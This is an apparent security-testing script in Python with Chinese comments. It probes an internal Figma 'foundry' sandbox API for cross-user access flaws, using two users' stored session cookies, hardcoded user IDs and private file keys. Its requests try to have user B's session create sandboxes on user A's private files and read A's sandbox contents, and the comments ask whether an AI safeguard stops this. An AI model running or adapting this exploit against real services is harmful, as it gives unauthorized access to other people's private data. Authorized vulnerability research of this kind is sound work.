"""foundry 核心越权验证(断点解锁,ws_cookie_A_new.txt 有效):
验证1: B 会话 + A 私有文件 key → sandbox(文件 ACL 是否校验,AI 墙是否挡)
验证2: A 会话 + A 私有 Make 文件 → sandbox → fs-snapshot(A→A 基线,看沙箱含什么)
验证3: sboxdUrl 跨会话 —— A 创建的 sandbox,B 会话能否直接读(沙箱归属校验)
验证4: B 会话 + B 自己文件 sandbox(对照)
"""
import io, json, urllib.request, sys
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CK_B = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
CK_A = io.open('ws_cookie_A_new.txt', encoding='utf-8').read().strip()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
B_UID = "1667396392129259941"
A_UID = "1666382703778278399"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"   # A 的 Make 文件(foundry 线专用)
A_F2 = "qzDqStIDJyGbthpKiuvfwg"     # A 私有文件
B_F = "xFETb3KJ8wh2U8wjD9jJeY"      # B 自己文件
PUB = "bv2nMIdFf4u3dESGail4sm"      # 公开文件(Demo Org)

def call(label, path, body=None, method="POST", file_key=None, ck=None, uid=None, raw=False):
    hdrs = {"User-Agent": UA, "Accept": "application/json",
            "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/",
            "Content-Type": "application/json", "Cookie": ck,
            "X-Figma-Org-ID": "", "X-Figma-Team-ID": "",
            "X-Figma-Client-Lifecycle-ID": "probe",
            "Tsid": "probe", "X-Referer-Service": "web"}
    if uid: hdrs["X-Figma-User-ID"] = uid
    if file_key: hdrs["X-Figma-File-Key"] = file_key
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request("https://www.figma.com" + path, data=data, headers=hdrs, method=method)
    try:
        r = urllib.request.urlopen(req, timeout=20)
        resp = r.read().decode(errors='replace')
        print(f"[{label}] {r.status}  {len(resp)}B  {resp[:350]}")
        return resp if raw else None
    except urllib.error.HTTPError as e:
        resp = e.read().decode(errors='replace')
        print(f"[{label}] {e.code}  {resp[:350]}")
        return resp if raw else None
    except Exception as e:
        print(f"[{label}] !! {type(e).__name__} {str(e)[:80]}")
        return None

print("======== 验证1: B 会话 + A 私有文件(越权面) ========")
r1 = call("B+A私有文件 sandbox", "/api/cortex/foundry/sandbox", {},
          file_key=A_F2, ck=CK_B, uid=B_UID, raw=True)
r2 = call("B+A Make文件 sandbox", "/api/cortex/foundry/sandbox", {},
          file_key=A_MAKE, ck=CK_B, uid=B_UID, raw=True)

print("\n======== 验证2: A 会话 + A 私有 Make 文件(基线) ========")
r3 = call("A+A Make文件 sandbox", "/api/cortex/foundry/sandbox", {},
          file_key=A_MAKE, ck=CK_A, uid=A_UID, raw=True)
a_sboxd = None
if r3:
    try:
        a_sboxd = json.loads(r3).get("sboxdUrl")
        print("  A 的 sboxdUrl:", a_sboxd)
    except Exception as e:
        print("  parse fail", e)
if a_sboxd:
    print("-- A 会话 fs-snapshot(基线,看沙箱内容) --")
    call("A snapshot", "/api/cortex/foundry/fs-snapshot",
         {"sboxdUrl": a_sboxd, "path": ".", "options": {"listing": "recursive", "content": "none"}},
         file_key=A_MAKE, ck=CK_A, uid=A_UID)

print("\n======== 验证3: sboxdUrl 跨会话(B 会话读 A 的 sandbox) ========")
if a_sboxd:
    call("B读A的sandbox fs-read-file", "/api/cortex/foundry/fs-read-file",
         {"sboxdUrl": a_sboxd, "path": "package.json"},
         file_key=A_MAKE, ck=CK_B, uid=B_UID)
    call("B读A的sandbox fs-snapshot", "/api/cortex/foundry/fs-snapshot",
         {"sboxdUrl": a_sboxd, "path": ".", "options": {"listing": "recursive", "content": "none"}},
         file_key=A_MAKE, ck=CK_B, uid=B_UID)

print("\n======== 验证4: B 会话 + B 自己文件(对照) ========")
r4 = call("B+B自己文件 sandbox", "/api/cortex/foundry/sandbox", {},
          file_key=B_F, ck=CK_B, uid=B_UID, raw=True)
b_sboxd = None
if r4:
    try:
        b_sboxd = json.loads(r4).get("sboxdUrl")
        print("  B 的 sboxdUrl:", b_sboxd)
    except Exception as e:
        print("  parse fail", e)
if b_sboxd:
    call("B snapshot(自己)", "/api/cortex/foundry/fs-snapshot",
         {"sboxdUrl": b_sboxd, "path": ".", "options": {"listing": "recursive", "content": "none"}},
         file_key=B_F, ck=CK_B, uid=B_UID)
